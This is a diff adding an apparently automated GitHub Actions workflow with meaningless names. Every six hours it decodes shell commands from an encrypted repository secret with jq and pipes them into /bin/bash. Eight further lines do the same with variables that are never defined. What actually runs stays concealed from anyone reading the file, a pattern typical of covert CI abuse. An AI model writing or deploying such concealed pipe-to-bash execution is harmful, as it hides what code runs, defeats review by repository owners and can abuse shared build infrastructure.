@@ -1,0 +1,25 @@
+name: yangcuixue7615
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangcuixue7615
+        env:
+          zkzht826: ${{ secrets.zkzht826 }}
+        run: |
+          echo $zkzht826 | jq -r .wfv9759 | /bin/bash
+          echo $jjxf71 | jq -r .nbe8037 | /bin/bash
+          echo $in626 | jq -r .lacax69203 | /bin/bash
+          echo $lnvi3 | jq -r .nf13777 | /bin/bash
+          echo $kl08444 | jq -r .jueg2024 | /bin/bash
+          echo $p3259 | jq -r .jwnkh00843 | /bin/bash
+          echo $q21 | jq -r .k741 | /bin/bash
+          echo $tz925 | jq -r .keyg3 | /bin/bash
+          echo $cikdu8980 | jq -r .v275 | /bin/bash
+
